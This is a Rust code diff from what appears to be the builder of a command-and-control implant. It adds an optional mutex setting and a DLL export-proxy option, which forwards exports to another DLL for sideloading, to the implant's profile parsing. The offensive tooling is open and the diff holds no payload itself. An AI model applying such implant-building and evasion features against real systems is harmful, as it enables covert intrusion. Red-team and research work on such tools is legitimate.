@@ -38,6 +38,7 @@ pub struct Implant {
     pub evasion: Evasion,
     pub exports: Exports,
     pub string_stomp: Option<StringStomp>,
+    pub mutex: Option<String>,
 }
 
 #[derive(Deserialize, Debug, Default, Clone)]
@@ -152,6 +153,7 @@ impl Profile {
             exports: implant.exports.clone(),
             svc_name: implant.svc_name.clone(),
             string_stomp,
+            mutex: implant.mutex.clone(),
         })
     }
 }
@@ -263,6 +265,7 @@ async fn read_profile(path: &Path) -> io::Result<Profile> {
 pub struct ParsedExportStrings {
     pub export_only_jmp_wyrm: String,
     pub export_machine_code: String,
+    pub export_proxy: String,
 }
 
 impl ParsedExportStrings {
@@ -270,13 +273,15 @@ impl ParsedExportStrings {
         Self {
             export_only_jmp_wyrm: String::new(),
             export_machine_code: String::new(),
+            export_proxy: String::new(),
         }
     }
 
-    fn from(plain_only: String, machine_code: String) -> Self {
+    fn from(plain_only: String, machine_code: String, export_proxy: String) -> Self {
         Self {
             export_only_jmp_wyrm: plain_only,
             export_machine_code: machine_code,
+            export_proxy,
         }
     }
 }
@@ -289,10 +294,9 @@ pub fn parse_exports_to_string_for_env(exports: &Exports) -> ParsedExportStrings
         None => return ParsedExportStrings::empty(),
     };
 
-    // For building with junk / user defined machine code
     let mut builder_with_machine_code = String::new();
-    // For building just the Export -> call start_wyrm;
     let mut builder_plain = String::new();
+    let mut builder_proxy = String::new();
 
     for e in exports {
         if let Some(machine_code) = &e.1.machine_code {
@@ -304,10 +308,14 @@ pub fn parse_exports_to_string_for_env(exports: &Exports) -> ParsedExportStrings
             // remove the trailing ','
             builder_with_machine_code.remove(builder_with_machine_code.len() - 1);
             builder_with_machine_code.push_str(";");
+        } else if let Some(proxy_data) = &e.1.proxy {
+            for (func, dll) in proxy_data {
+                builder_proxy.push_str(&format!("{}={}.{};", func, dll, func));
+            }
         } else {
             builder_plain.push_str(format!("{};", e.0,).as_str());
         }
     }
 
-    ParsedExportStrings::from(builder_plain, builder_with_machine_code)
+    ParsedExportStrings::from(builder_plain, builder_with_machine_code, builder_proxy)
 }
